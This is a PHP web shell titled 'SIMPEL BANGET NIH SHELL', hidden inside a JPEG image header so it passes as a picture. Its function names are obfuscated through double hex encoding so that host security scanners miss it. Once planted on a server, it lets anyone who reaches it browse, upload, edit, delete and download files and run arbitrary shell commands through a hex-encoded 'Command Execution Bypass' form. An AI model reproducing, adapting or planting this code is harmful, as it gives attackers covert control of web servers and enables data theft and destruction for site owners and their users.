ÿØÿà JFIF  x x  ÿÛ C       	
	
  



 	

ÿÛ C ÿÀ   " ÿÄ            	

ÿÄ µ   } !1AQa "q2‘¡#B±ÁRÑğ$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ         	

ÿÄ µ   w !1AQ aq"2B‘¡±Á	#3RğbrÑ<?php

/*
 * This file just for test for server who using imunify,cloudflare etc,
 *
 * (c) Setsuna Watanabe <yucaerin@hotmail.com>
 *
 * GOOD LUCK, HAVE FUN!
 */

session_start();
error_reporting(E_ALL);
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

$Array = [
    '36643662',
    '363436393732',
    '36373635373435663636363936633635356637303635373236643639373337333639366636653733',
    '3639373335663737373236393734363136323663363535663730363537323664363937333733363936663665',
    '36353738363536333735373436353433366636643664363136653634',
    '373037323666363335663666373036353665',
    '3733373437323635363136643566363736353734356636333666366537343635366537343733',
    '36363639366336353566363736353734356636333666366537343635366537343733',
    '36363639366336353566373037353734356636333666366537343635366537343733',
    '3632363936653332363836353738',
    '366436663736363535663735373036633666363136343635363435663636363936633635',
    '3638373436643663373337303635363336393631366336333638363137323733',
    '3638363537383332363236393665',
    '373036383730356637353665363136643635',
    '3733363336313665363436393732',
    '363937333566363436393732',
    '36363639366336353566363537383639373337343733',
    '37323635363136343636363936633635',
    '36363639366336353733363937613635',
    '36393733356637373732363937343631363236633635',
    '373236353665363136643635',
    '363636393663363537303635373236643733',
    '3733373037323639366537343636',
    '373337353632373337343732',
    '363636333663366637333635',
    '373037323666363335663666373036353665',
    '36393733356637323635373336663735373236333635',
    '3730373236663633356636333663366637333635',
    '373536653663363936653662',
    '3639373335663636363936633635',
    '34353534', //30
    '353634353532',
    '3533343934663465',
    '346334353533',
    '35333534',
    '3633366636643664363136653634',
    '3737366637323662363936653637343436393732363536333734366637323739',
    '363337323635363137343635343436393732363536333734366637323739',
    '37303639373036353733',
    '36363639366336353733',
    '3636363936633635',
    '36363639366336353534366634343666373736653663366636313634',
];

$SETSUNA = [];
foreach ($Array as $hexString) {
    $SETSUNA[] = hex2bin(hex2bin($hexString));
}

$satu = '_G';
$dua = $SETSUNA[30];
$tiga = '_SER';
$empat = $SETSUNA[31];
$lima = '_SES';
$enam = $SETSUNA[32];
$tujuh = '_FI';
$delapan = $SETSUNA[33];
$sembilan = '_PO';
$sepuluh = $SETSUNA[34];
$sebelas = 'ev';
$duabelas = 'al';
$tigabelas = 'iss';
$empatbelas = 'et';

// Gunakan $SETSUNA sesuai kebutuhan
$a = $SETSUNA[0];
$b = $SETSUNA[1];
$c = $a . $b;
$EVA = $sebelas . $duabelas;
global $EVA;
$L = $GLOBALS[$satu . $dua];
$M = $GLOBALS[$tiga . $empat];
$N = $GLOBALS[$lima . $enam];
$e = $GLOBALS[$tujuh . $delapan];
$o = $GLOBALS[$sembilan . $sepuluh];
$f = $SETSUNA[2];
$g = $SETSUNA[3];
$h = $SETSUNA[4];
$i = $SETSUNA[5];
$j = $SETSUNA[6];
$q = $SETSUNA[7];
$s = $SETSUNA[8];
$v = $SETSUNA[9];
$w = $SETSUNA[10];
$y = $SETSUNA[11];
$z = $SETSUNA[12];
$NM = $SETSUNA[13];
$SCN = $SETSUNA[14];
$ID = $SETSUNA[15];
$FE = $SETSUNA[16];
$RF = $SETSUNA[17];
$FS = $SETSUNA[18];
$IW = $SETSUNA[19];
$RNM = $SETSUNA[20];
$FP = $SETSUNA[21];
$SPRF = $SETSUNA[22];
$SBSR = $SETSUNA[23];
$FCL = $SETSUNA[24];
$PROP = $SETSUNA[25];
$IR = $SETSUNA[26];
$PRCL = $SETSUNA[27];
$UNL = $SETSUNA[28];
$ISF = $SETSUNA[29];
$FTD = $SETSUNA[41];
$ISS = $tigabelas . $empatbelas;

$ISS = function ($array, $elementName) {
    return array_key_exists($elementName, $array);
};

$b = $ISS($L, $b) ? $z($L[$b]) : '.';
$files = $SCN($b);
$upload_message = '';
$edit_message = '';
$delete_message = '';
$create_dir_message = '';

// Function to create a new directory
function createDirectory($b, $newDirectoryName)
{
    $newDirPath = $b . '/' . $newDirectoryName;

        global $ID;
    if (!$ID($newDirPath)) {
        global $c;
        if ($c($newDirPath, 0755, true)) {
            return "Directory '$newDirectoryName' created successfully.";
        } else {
            return "Failed to create directory. Check directory permissions or other errors.";
        }
    } else {
        return "Directory '$newDirectoryName' already available.";
    }
}

// Function to Download
global $FS, $FTD;
if ($ISS($L, 'download')) {
    $FTD = $z($L['download']);
    // Make sure that the requested file exists
    if ($FE($FTD)) {
        // Set header to trigger download
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($FTD) . '"');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . $FS($FTD));
        $RF($FTD);
        exit;
    } else {
        // Handle jika file tidak ditemukan
        echo "File not found.";
    }
}

// Function to get file permissions
function f($file): string {
    global $FP, $SPRF, $SBSR;
    return $SBSR($SPRF('%o', $FP($file)), -4);
}

// Function to check write permissions
function g($file): bool {
    global $IW;
    return $IW($file);
}

// Function to execute a command
function h($command, $workingDirectory = null)
{
    global $j, $FCL, $PROP, $IR, $PRCL;

    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = $PROP($command, $descriptorspec, $pipes, $workingDirectory);

    if ($IR($process)) {
        // Read output from stdout and stderr
        $output_stdout = $j($pipes[1]); // Ganti dengan $SETSUNA[6] jika diperlukan
        $output_stderr = $j($pipes[2]); // Ganti dengan $SETSUNA[6] jika diperlukan

        $FCL($pipes[0]);
        $FCL($pipes[1]);
        $FCL($pipes[2]);

        $return_value = $PRCL($process);

        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
    } else {
        return "Failed to execute command.";
    }
}

if ($ISS($L, '636d64')) {
    $command = $z($L['636d64']);
    $result = h($command, $b);
}

if ($ISS($e, 'file_upload')) {
    $tempFile = $e['file_upload']['tmp_name'];
    $targetFile = $b . '/' . $e['file_upload']['name'];
    if ($w($tempFile, $targetFile)) {
        $upload_message = 'File uploaded successfully.';
    } else {
        $upload_message = 'Failed to upload file.';
    }
}

//function for edit file
if ($ISS($o, 'edit_file')) {
    $file = $o['edit_file'];
    $content = $q($file);
    if ($content !== false) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Edit File</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    text-align: center;
                }
                header {
                    background-color: #4CAF50;
                    color: white;
                    padding: 1rem;
                }
                header h1 {
                    margin: 0;
                }
                main {
                    padding: 1rem;
                }
                form {
                    width: 50%;
                    margin: auto;
                    text-align: left;
                }
                textarea {
                    width: 100%;
                    height: 300px;
                }
                input[type="submit"] {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-top: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }
                input[type="submit"]:hover {
                    background-color: #45a049;
                }
                .btn {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-left: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }

                .btn-download {
                    background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-left: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }

                .btn:hover {
                    background-color: #45a049;
                }
            </style>
        </head>
        <body>
            <header>
                <h1>Edit File</h1>
            </header>
            <main>
                <form method="post" action="">
                    <textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control"><?php echo $y($content); ?></textarea>
                    <input type="hidden" name="edited_file" value="<?php echo $y($file); ?>">
                    <input type="submit" name="submit_edit" value="Submit">
                </form>
            </main>
        </body>
        </html>
        <?php
        exit;
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if ($ISS($o, 'submit_edit')) {
    $file = $o['edited_file'];
    $content = $o['file_content'];
    if ($s($file, $content) !== false) {
        $edit_message = 'File Edit Successfully.';
    } else {
        $edit_message = 'Failed To Edit File.';
    }
}

if ($ISS($o, 'delete_file')) {
    global $UNL;
    $file = $o['delete_file'];
    if ($UNL($file)) {
        $delete_message = 'File deleted successfully.';
    } else {
        $delete_message = 'Failed to delete file.';
    }
}

if ($ISS($o, 'create_dir')) {
    $newDirName = $o['new_dir_name'];
    $create_dir_message = createDirectory($b, $newDirName);
}

// Fungsi untuk menampilkan pesan
function showMessage($message, $y)
{
    echo '<p>' . z($message) . '</p>';
}

$un = $NM();
$current_dir = realpath($b);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIMPEL BANGET NIH SHELL</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 50%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 0.5rem;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        form {
            display: inline-block;
            margin: 1rem 0;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        /* Gaya CSS untuk hasil command */
        div {
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            padding: 10px;
            margin-top: 20px;
            overflow: auto;
        }

        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .btn {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }

        .btn-download {
            background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }

        .btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <header>
        <h1>SIMPEL BANGET NIH SHELL</h1>
    </header>
    <main>
        <p>Current directory: <?php echo($current_dir); ?></p>
        <p>Server information: <?php echo $un; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo($upload_message); ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo($edit_message); ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo($delete_message); ?></p>
        <?php endif; ?>
        <?php if (!empty($create_dir_message)): ?>
        <p><?php echo($create_dir_message); ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload file:</label>
            <input type="file" name="file_upload">
            <input type="submit" value="Upload">
            <input type="hidden" name="dir" value="<?php echo($b); ?>">
        </form>
        </br>
        <form method="POST">
            <label>Create directory:</label>
            <input type="text" name="new_dir_name" required>
            <input type="submit" name="create_dir" value="Create">
            <input type="hidden" name="dir" value="<?php echo($b); ?>">
        </form>
        <table>
            <tr>
                <th>Filename</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($files as $file): ?>
            <tr>
                <td>
                    <?php if ($ID($b . '/' . $file)): ?>
                    <a href="?dir=<?php echo $v($b . '/' . $file); ?>" style="color: <?php echo g($b . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
                    <?php else: ?>
                    <?php echo $file; ?></a>
                    <?php endif; ?>
                </td>
                <td style="color: <?php echo g($b . '/' . $file) ? 'green' : 'red'; ?>">
                    <?php echo $ISF($b . '/' . $file) ? f($b . '/' . $file) : (g($b . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
                </td>
                <td>
                    <?php if ($ISF($b . '/' . $file)): ?>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="edit_file" value="<?php echo $b . '/' . $file; ?>">
                        <button type="submit" class="btn btn-download">Edit</button>
                    </form>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="delete_file" value="<?php echo $b . '/' . $file; ?>">
                        <button type="submit" class="btn btn-download">Delete</button>
                    </form>
                    <form action="" method="get" style="display: inline-block;">
                    <input type="hidden" name="download" value="<?php echo bin2hex($b . '/' . $file); ?>">
                    <button type="submit" class="btn btn-download">Download</button>
                    </form>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
        <p><b>Command Execution Bypass</b></p>
        <form method="GET">
            <label>encode your command on <b><a href="https://encode-decode.com/bin2hex-decode-online/">https://encode-decode.com/bin2hex-decode-online/</a> :</b></label><br><br>
            <input type="hidden" name="dir" value="<?php echo $v($b); ?>">
            <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c"><br><br>
            <input type="submit" value="Execute">
        </form>
        <?php if ($ISS($GLOBALS, 'result')): ?>
            <div>
                <h2>Command Result:</h2>
                <pre><?php echo $y($result); ?></pre>
            </div>
        <?php endif; ?>
    </main>
</body>
</html>
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? üÿ ‡NşÔßôm?ÿ ğŞjÿ üEP ÿÙ